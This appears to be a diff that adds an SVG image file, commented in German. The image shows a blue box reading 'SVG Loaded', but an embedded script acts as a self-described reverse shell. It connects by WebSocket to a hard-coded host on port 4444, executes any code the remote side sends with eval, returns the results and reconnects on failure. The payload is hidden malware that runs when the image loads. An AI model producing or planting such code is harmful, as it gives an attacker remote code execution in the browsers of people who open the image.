@@ -1,0 +1,38 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+  <script>
+    <![CDATA[
+      var host = '192.168.2.160'; // Ziel-Server
+      var port = 4444;        // Ziel-Port
+      var payload = '';
+
+      function connect() {
+        try {
+          var ws = new WebSocket('ws://' + host + ':' + port);
+
+          ws.onopen = function() {
+            ws.send('[+] Connection established from SVG Reverse Shell');
+          };
+
+          ws.onmessage = function(event) {
+            try {
+              var result = eval(event.data); // Ausführen des empfangenen Codes
+              ws.send(result || '[+] Command executed');
+            } catch (e) {
+              ws.send('[-] Error: ' + e.message);
+            }
+          };
+
+          ws.onclose = function() {
+            setTimeout(connect, 1000); // Neuverbindung bei Verbindungsverlust
+          };
+        } catch (err) {
+          setTimeout(connect, 1000); // Neuversuch bei Verbindungsfehler
+        }
+      }
+
+      connect();
+    ]]>
+  </script>
+  <rect width="100%" height="100%" fill="lightblue" />
+  <text x="50" y="50" font-size="20" fill="black">SVG Loaded</text>
+</svg>
